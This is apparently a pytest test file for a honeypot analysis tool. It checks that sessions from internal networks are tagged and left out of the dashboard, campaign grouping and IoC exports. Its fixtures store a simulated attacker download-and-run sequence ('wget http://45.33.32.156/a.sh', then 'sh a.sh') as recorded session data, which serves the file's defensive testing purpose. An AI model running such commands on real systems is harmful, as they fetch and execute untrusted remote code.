"""Operator traffic is tagged, and left out of statistics, campaigns and exports."""

from datetime import UTC, datetime, timedelta

import pytest

pytest.importorskip("flask")

from sqlalchemy import select

from surya_kundal import campaigns as camp
from surya_kundal import export as ioc
from surya_kundal.cli import main
from surya_kundal.dashboard import queries
from surya_kundal.dashboard.app import create_app
from surya_kundal.database.engine import create_db_engine, init_db, make_session_factory
from surya_kundal.database.models import HoneypotSession
from surya_kundal.database.repository import save_session
from surya_kundal.internal import (
    InternalNetworksError,
    is_internal,
    parse_networks,
    reclassify,
)
from surya_kundal.mapping.store import map_pending

T0 = datetime(2026, 10, 1, 12, 0, tzinfo=UTC)


@pytest.fixture(autouse=True)
def clean_env(monkeypatch):
    monkeypatch.delenv("INTERNAL_NETWORKS", raising=False)


@pytest.mark.parametrize(
    ("ip", "expected"),
    [
        ("127.0.0.1", True),
        ("172.20.0.1", True),
        ("172.29.77.1", True),
        ("10.1.2.3", True),
        ("192.168.1.5", True),
        ("100.64.0.9", True),
        ("169.254.169.254", True),
        ("::1", True),
        ("fd00::1", True),
        ("::ffff:10.0.0.1", True),
        ("80.66.76.10", False),
        ("203.0.113.7", False),  # documentation range: used by this project's own examples
        ("2606:4700::1", False),
        (None, False),
        ("", False),
        ("not an address", False),
    ],
)
def test_classification(ip, expected):
    assert is_internal(ip) is expected


def test_listed_networks_count_too(monkeypatch):
    monkeypatch.setenv("INTERNAL_NETWORKS", "80.66.76.10, 45.33.0.0/16")
    assert is_internal("80.66.76.10") and is_internal("45.33.32.156")
    assert not is_internal("80.66.76.11")
    assert not is_internal("2606:4700::1")  # a family mismatch never matches


def test_bad_network_text_is_refused():
    with pytest.raises(InternalNetworksError, match="banana"):
        parse_networks("10.0.0.0/8, banana")


@pytest.fixture
def db(tmp_path):
    engine = create_db_engine(f"sqlite:///{tmp_path / 'i.db'}")
    init_db(engine)
    with make_session_factory(engine)() as session:
        yield session


def add(db, sid, ip, hours=0, commands=("wget http://45.33.32.156/a.sh",)):
    when = T0 + timedelta(hours=hours)
    save_session(
        db,
        sid,
        {
            "src_ip": ip,
            "start_time": when.isoformat(),
            "logins": [
                {
                    "username": "root",
                    "password": "x",
                    "success": True,
                    "timestamp": when.isoformat(),
                }
            ],
            "commands": [
                {"command": c, "timestamp": (when + timedelta(seconds=n)).isoformat()}
                for n, c in enumerate(commands)
            ],
        },
    )
    db.commit()


def test_ingest_sets_the_flag(db):
    add(db, "a", "172.29.77.1")
    add(db, "b", "80.66.76.10")
    flags = {s.id: s.internal for s in db.scalars(select(HoneypotSession))}
    assert flags == {"a": True, "b": False}


def test_dashboard_leaves_internal_sessions_out_unless_asked(db):
    add(db, "a", "172.29.77.1")
    add(db, "b", "80.66.76.10")
    assert queries.totals(db).sessions == 1 and queries.totals(db).commands == 1
    assert queries.sessions_page(db).total == 1
    assert queries.depth(db).contact == 1
    assert queries.pulse(db)[0] == 2  # liveness counts everything the pipeline stored
    queries.show_internal(True)
    try:
        assert queries.totals(db).sessions == 2 and queries.sessions_page(db).total == 2
    finally:
        queries.show_internal(False)
    assert queries.session_detail(db, "a") is not None  # a direct link still works


def test_app_flag_controls_the_pages(tmp_path):
    engine = create_db_engine(f"sqlite:///{tmp_path / 'w.db'}")
    init_db(engine)
    factory = make_session_factory(engine)
    with factory() as session:
        add(session, "aaaaaaaa1", "172.29.77.1")
    hidden = create_app(factory).test_client().get("/sessions").get_data(as_text=True)
    shown = create_app(factory, show_internal=True).test_client().get("/sessions")
    assert "172.29.77.1" not in hidden
    assert "172.29.77.1" in shown.get_data(as_text=True)


def test_campaigns_ignore_internal_sessions(db):
    script = ["cd /tmp", "wget http://45.33.32.156/a.sh", "sh a.sh"]
    add(db, "a", "172.29.77.1", 0, script)
    add(db, "b", "80.66.76.10", 1, script)
    add(db, "c", "80.66.76.11", 2, script)
    assert {f.id for f in camp.load_facts(db)} == {"b", "c"}
    assert {f.id for f in camp.load_facts(db, include_internal=True)} == {"a", "b", "c"}


def test_export_skips_internal_sessions_including_listed_addresses(db, monkeypatch):
    add(db, "a", "80.66.76.10")
    add(db, "b", "80.66.76.11")
    map_pending(db)
    now = T0 + timedelta(days=1)
    both, _ = ioc.collect(db, now=now, filters=ioc.Filters(types=("ip", "url")))
    assert {i.value for i in both if i.kind != "url"} == {"80.66.76.10", "80.66.76.11"}
    monkeypatch.setenv("INTERNAL_NETWORKS", "80.66.76.10")
    assert reclassify(db) == (1, 1, 2)
    after, _ = ioc.collect(db, now=now, filters=ioc.Filters(types=("ip", "url")))
    assert {i.value for i in after if i.kind != "url"} == {"80.66.76.11"}
    assert [i.sessions for i in after if i.kind == "url"] == [1]  # session b only (attempts)


def test_reclassify_command(tmp_path, monkeypatch, capsys):
    path = tmp_path / "r.db"
    url = f"sqlite:///{path}"
    engine = create_db_engine(url)
    init_db(engine)
    with make_session_factory(engine)() as session:
        add(session, "a", "80.66.76.10")
    monkeypatch.setenv("INTERNAL_NETWORKS", "80.66.76.0/24")
    assert main(["reclassify", "--db", url]) == 0
    assert "1 of 1 session(s) are internal; 1 changed" in capsys.readouterr().out
    monkeypatch.setenv("INTERNAL_NETWORKS", "nonsense")
    assert main(["reclassify", "--db", url]) == 2
